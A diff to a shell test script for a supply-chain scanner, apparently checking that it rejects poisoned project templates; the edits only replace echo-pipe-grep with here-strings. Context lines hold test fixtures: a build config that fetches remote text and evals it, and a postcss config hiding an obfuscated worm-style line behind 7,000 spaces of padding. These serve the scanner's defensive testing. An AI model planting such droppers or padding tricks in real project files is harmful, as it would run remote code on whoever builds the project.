@@ -22,12 +22,12 @@ run_expect() { # label dir expected_exit needle
   set -e
   local ok=1
   [[ "$code" -eq "$expect" ]] || ok=0
-  echo "$out" | grep -qF -- "$needle" || ok=0
+  grep -qF -- "$needle" <<<"$out" || ok=0
   if [[ "$ok" -eq 1 ]]; then
     echo "  ok  $label (exit $code)"
   else
     echo "  XX  $label — expected exit $expect + '$needle', got exit $code"
-    echo "$out" | grep -E 'VERDICT|CRIT|HIGH|findings' | head -6
+    grep -E 'VERDICT|CRIT|HIGH|findings' <<<"$out" | head -6
     FAILURES=$((FAILURES + 1))
   fi
 }
@@ -49,9 +49,9 @@ export default defineConfig(async () => { eval(await (await fetch(u)).text()); r
 EOF
 run_expect "poisoned template -> REJECT" "$P" 1 "VERDICT: REJECT"
 OUTP="$(bash "$VET" "$P" 2>&1 || true)"
-echo "$OUTP" | grep -qF "lifecycle script" && echo "  ok  postinstall lifecycle flagged" || { echo "  XX  postinstall not flagged"; FAILURES=$((FAILURES+1)); }
-echo "$OUTP" | grep -qF "config file" && echo "  ok  config-file dropper flagged" || { echo "  XX  config dropper not flagged"; FAILURES=$((FAILURES+1)); }
-echo "$OUTP" | grep -qF "no install/build/postinstall was or will be run" && echo "  ok  scan-only header present" || { echo "  XX  scan-only header missing"; FAILURES=$((FAILURES+1)); }
+grep -qF "lifecycle script" <<<"$OUTP" && echo "  ok  postinstall lifecycle flagged" || { echo "  XX  postinstall not flagged"; FAILURES=$((FAILURES+1)); }
+grep -qF "config file" <<<"$OUTP" && echo "  ok  config-file dropper flagged" || { echo "  XX  config dropper not flagged"; FAILURES=$((FAILURES+1)); }
+grep -qF "no install/build/postinstall was or will be run" <<<"$OUTP" && echo "  ok  scan-only header present" || { echo "  XX  scan-only header missing"; FAILURES=$((FAILURES+1)); }
 
 # 2) CLEAN template: ordinary scripts, clean config, no lifecycle hooks.
 C="$TMP/clean"; mkdir -p "$C"
@@ -97,7 +97,7 @@ WORM_PAD="$(printf '%*s' 7000 '')"
 printf 'export default config;%s%s\n' "$WORM_PAD" "global['!']='9-7678';var _0x1a2b3c=1;" >"$G/postcss.config.mjs"
 run_expect "committed-config worm -> REJECT" "$G" 1 "VERDICT: REJECT"
 OUTG="$(bash "$VET" "$G" 2>&1 || true)"
-echo "$OUTG" | grep -qF "WORM" && echo "  ok  WORM class surfaced through vet-incoming" || { echo "  XX  WORM class not surfaced"; FAILURES=$((FAILURES+1)); }
+grep -qF "WORM" <<<"$OUTG" && echo "  ok  WORM class surfaced through vet-incoming" || { echo "  XX  WORM class not surfaced"; FAILURES=$((FAILURES+1)); }
 
 echo "---"
 if [[ "$FAILURES" -eq 0 ]]; then
